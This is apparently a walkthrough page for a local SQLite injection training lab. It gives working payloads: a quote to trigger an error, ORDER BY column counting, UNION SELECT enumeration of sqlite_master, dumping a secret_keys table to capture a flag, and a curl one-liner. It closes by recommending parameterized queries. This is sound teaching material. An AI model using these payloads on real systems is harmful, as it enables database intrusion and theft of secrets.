<h4>Step 1: Test Normal Search</h4>
<p>Search for books to see the normal application behavior.</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Search</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>SQL<br>
        <span class="prompt">SQL: </span>SELECT id, title, author FROM books WHERE title LIKE '%SQL%'<br><br>
        <span class="prompt">Output:</span><br>
        id | title | author<br>
        1 | The Art of SQL | John Doe<br>
        3 | SQL Antipatterns | Bill Karwin<br>
        4 | Learning SQL | Alan Beaulieu<br>
        5 | SQL Cookbook | Anthony Molinaro
    </div>
</div>

<h4>Step 2: Confirm Injection</h4>
<p>Inject a single quote to break the query syntax.</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Trigger Error</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>'<br>
        <span class="prompt">Error: </span><strong>SQLite Error: unrecognized token: "&#039;"</strong>
    </div>
</div>

<h4>Step 3: Determine Column Count</h4>
<p>Use ORDER BY to find how many columns the original query returns.</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Find Column Count</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' ORDER BY 3 -- -<br>
        <span class="prompt">Result: </span>No error (3 columns confirmed: id, title, author)<br><br>
        <span class="prompt">Input: </span>' ORDER BY 4 -- -<br>
        <span class="prompt">Result: </span><strong>SQLite Error: 1st ORDER BY term out of range - should be between 1 and 3</strong>
    </div>
</div>

<h4>Step 4: Enumerate Tables via sqlite_master</h4>
<p>
    In SQLite, the system catalog is <code>sqlite_master</code> (equivalent to MySQL's
    <code>information_schema</code>). It has columns: <code>type</code>, <code>name</code>,
    <code>tbl_name</code>, <code>rootpage</code>, and <code>sql</code> (the CREATE TABLE DDL).
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. List All Tables</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>zzz' UNION SELECT name, type, sql FROM sqlite_master WHERE type='table' -- -<br><br>
        <span class="prompt">Output:</span><br>
        id | title | author<br>
        books | table | CREATE TABLE books (<br>
        &nbsp;&nbsp;&nbsp;&nbsp;id INTEGER PRIMARY KEY,<br>
        &nbsp;&nbsp;&nbsp;&nbsp;title TEXT,<br>
        &nbsp;&nbsp;&nbsp;&nbsp;author TEXT<br>
        )<br>
        <strong>secret_keys</strong> | table | CREATE TABLE secret_keys (<br>
        &nbsp;&nbsp;&nbsp;&nbsp;id INTEGER PRIMARY KEY,<br>
        &nbsp;&nbsp;&nbsp;&nbsp;key_name TEXT,<br>
        &nbsp;&nbsp;&nbsp;&nbsp;key_value TEXT<br>
        )
    </div>
</div>

<p>Found a hidden table: <code>secret_keys</code>!</p>

<h4>Step 5: Extract the Flag from secret_keys</h4>
<p>Now pull all data from the hidden table.</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Extract the Flag</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>zzz' UNION SELECT id, key_name, key_value FROM secret_keys -- -<br><br>
        <span class="prompt">Output:</span><br>
        id | title | author<br>
        1 | api_key | sk-1234567890abcdef<br>
        2 | master_flag | <strong>FLAG{sq_m4st3r_3num3r4t10n}</strong><br>
        3 | encryption_key | aes-256-cbc-random
    </div>
</div>

<h4>Step 6: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{sq_m4st3r_3num3r4t10n}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab1" \<br> --data-urlencode "title=zzz' UNION SELECT id, key_name, key_value FROM secret_keys -- -"
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> <code>sqlite_master</code> is the system catalog in SQLite: equivalent
    to MySQL's <code>information_schema</code>. It contains the <code>name</code>, <code>type</code>,
    and <code>sql</code> (DDL) of every database object. The <code>sql</code> column is especially useful
    as it reveals the exact CREATE TABLE statement with all column names. Always use parameterized queries
    (<code>$conn->prepare()</code> + <code>bindValue()</code>) to prevent SQL injection.
</div>
